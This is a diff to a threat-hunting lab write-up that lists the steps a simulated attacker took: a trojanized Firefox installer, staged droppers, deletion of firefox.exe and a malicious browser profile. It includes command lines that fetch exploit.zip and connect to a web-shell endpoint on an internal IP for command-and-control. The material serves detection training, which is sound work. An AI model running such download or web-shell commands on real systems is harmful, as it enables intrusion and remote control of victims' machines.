@@ -3,8 +3,23 @@
 
 ## Steps the "Bad Actor" took Create Logs and IoCs:
 
-**1**. Initial Compromise: Downloaded a trojanized Firefox installer disguised as a legitimate file (`Firefox Installer.exe`) to `C:\Users\employee0\Downloads\` at 04:29:57 UTC from what appeared to be Mozilla's official CDN.
+1. Initial Compromise: Downloaded a trojanized Firefox installer disguised as a legitimate file (`Firefox Installer.exe`) to `C:\Users\employee0\Downloads\` at 04:29:57 UTC from what appeared to be Mozilla's official CDN.
 
+2. First Malicious Execution: Executed  `setup-stub.exe ` (SHA256: `181baa1380e339d8acb6b067c33dd36a5f56e57ee05f7e524b752affaafa75ac `)
+   `  setup-stub.exe -no-remote -profile "C:\Users\employee0\Downloads\Temp\MalProfile" http://[192.168.1.100]/exploit.zip `
+
+3. **Web Shell Connection Established**: Re-executed `setup-stub.exe` targeting a web shell endpoint for command-and-control:
+    `setup-stub.exe -no-remote -profile "C:\Users\employee0\Downloads\Temp\MalProfile" http://[192.168.1.100]/admin/shell.php`
+   
+4. Multi-Stage Dropper Deployment: Three sequential download.exe executions occurred from randomized temporary directories, indicating a staged infection process:
+- `C:\Users\EMPLOY~1\AppData\Local\Temp\nskC4FD.tmp\download.exe` (05:11:57 UTC)
+- `C:\Users\EMPLOY~1\AppData\Local\Temp\nso90D.tmp\download.exe` (05:54:48 UTC - SHA256: `b5284b0e4a5f867a1342a4bc5a7ca21b9c13c49bea1b48624b691473d14dec78`)
+- `C:\Users\EMPLOY~1\AppData\Local\Temp\nss9E77.tmp\download.exe` (05:55:31 UTC)
+Each executed with: `/LaunchedFromStub /INI=[temp_path]\config.ini`
+
+5. Anti-Forensics: Deleted legitimate `firefox.exe` from `C:\Program Files\Mozilla Firefox\` at 05:55:24 UTC to remove evidence and potentially replace with compromised binary. Deletion initiated by the malicious stub process.
+
+6. Persistence Establishment: Created malicious profile directory  `Temp\MalProfile ` to maintain persistent connection to remote command server and host additional payloads.
 ---
 
 ## Tables Used to Detect IoCs:
